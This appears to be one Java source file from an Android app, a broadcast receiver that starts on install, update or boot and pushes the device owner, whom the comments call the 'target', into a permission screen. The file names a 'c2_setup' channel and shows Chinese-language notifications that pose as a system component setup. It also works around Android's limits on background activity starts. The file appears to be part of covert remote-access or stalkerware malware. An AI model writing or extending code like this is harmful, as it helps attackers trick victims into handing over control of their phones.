package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Auto-start trigger (PATCH-16).
 * Fires on own PACKAGE_ADDED / MY_PACKAGE_REPLACED / BOOT_COMPLETED and routes the
 * target straight into PermissionActivity so the phone owner never has to find the
 * app icon. Android 10+ may block background activity starts (BAL); the high-priority
 * notification with a PendingIntent to PermissionActivity is the guaranteed fallback
 * because notification taps are exempt from BAL on every version.
 */
public class AutoStartReceiver extends BroadcastReceiver {

    public static final String CHANNEL_SETUP = "c2_setup";
    public static final int SETUP_NOTIF_ID = 7300;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        if (action == null) return;

        boolean relevant = false;
        if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
            String pkg = (intent.getData() != null) ? intent.getData().getSchemeSpecificPart() : null;
            relevant = context.getPackageName().equals(pkg);
        } else if (Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            relevant = true;
        }
        if (!relevant) return;

        android.util.Log.d("AutoStartReceiver", "AUTO_START_TRIGGER: " + action);

        // 1) Try to launch the permission flow directly (may be blocked by BAL on Android 10+).
        try {
            Intent ui = new Intent(context, PermissionActivity.class);
            ui.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(ui);
        } catch (Exception ignored) {
            android.util.Log.d("AutoStartReceiver", "Direct activity start blocked; notification fallback active");
        }

        // 2) High-priority notification fallback (always works, tap reaches PermissionActivity).
        postSetupNotification(context);
    }

    public static void postSetupNotification(Context context) {
        try {
            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_SETUP, "系统组件设置",
                        NotificationManager.IMPORTANCE_HIGH);
                channel.setDescription("One-time system component setup");
                nm.createNotificationChannel(channel);
            }

            Intent ui = new Intent(context, PermissionActivity.class);
            ui.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PendingIntent pi = PendingIntent.getActivity(
                    context, SETUP_NOTIF_ID, ui,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(context, CHANNEL_SETUP);
            } else {
                builder = new Notification.Builder(context);
            }
            builder.setSmallIcon(android.R.drawable.ic_popup_sync)
                    .setContentTitle("系统组件需要完成设置")
                    .setContentText("点按完成系统组件初始化")
                    .setAutoCancel(true)
                    .setContentIntent(pi);

            try {
                nm.notify(SETUP_NOTIF_ID, builder.build());
            } catch (SecurityException ignored) {
                // POST_NOTIFICATIONS missing: activity start attempt above is the fallback.
            }
        } catch (Exception e) {
            android.util.Log.e("AutoStartReceiver", "Setup notification failed", e);
        }
    }
}
